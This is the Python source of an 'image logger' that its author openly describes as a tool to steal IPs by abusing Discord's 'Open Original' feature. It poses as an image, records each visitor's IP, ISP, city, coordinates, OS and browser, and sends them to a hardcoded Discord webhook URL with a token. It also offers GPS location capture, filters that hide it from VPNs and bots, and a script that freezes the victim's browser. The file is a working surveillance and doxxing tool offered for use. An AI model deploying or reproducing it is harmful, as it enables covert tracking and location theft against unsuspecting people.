# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1135363008445567036/iWktVTzUM10bG6Ccegwpk7DlbSg6fjiQvVk5GBu-6lwrMNoDY_XmPCgdaLSQ4PIspZ2f",
    "image": "data:image/jpeg;base64,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"
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
